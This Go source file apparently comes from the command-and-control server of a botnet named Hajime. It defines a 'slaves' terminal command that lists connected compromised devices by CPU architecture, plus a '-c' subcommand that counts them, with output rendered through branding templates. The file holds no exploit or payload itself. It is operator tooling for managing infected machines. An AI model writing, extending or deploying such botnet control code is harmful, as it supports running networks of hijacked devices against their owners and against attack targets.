package commands

import (
	"bytes"
	"hajime/source"
	"hajime/source/masters/sessions"
)

func init() {
	Register(&Command{
		Name:        "slaves",
		Description: "view the slaves connected",
		Admin:       false,

		// Execute will list all the slave arch types
		Execute: func(session *sessions.Session, args []string) error {
			if !session.User.Admin {
				return count(session, args)
			}

			slaves := source.CloneTypes()
			if len(slaves) == 0 {
				return nil
			}

			buf := bytes.NewBuffer(make([]byte, 0))
			for arch, connected := range slaves {
				payload, err := session.ExecuteBrandingToString(map[string]any{"arch": arch, "connected": connected}, "resources", "branding", "connected.tfx")
				if err != nil {
					return err
				}

				buf.WriteString(payload)
			}

			_, err := buf.WriteTo(session.Term)
			return err
		},

		Subcommands: []*Command{
			{
				Name:        "-c",
				Admin:       true,
				Description: "count the amount of slaves connected",
				Execute:     count,
			},
		},
	})
}

func count(session *sessions.Session, _ []string) error {
	payload, err := session.ExecuteBrandingToString(map[string]any{"arch": "total", "connected": len(source.Clone())}, "resources", "branding", "connected.tfx")
	if err != nil {
		return err
	}

	_, err = session.Term.Print(payload)
	return err
}
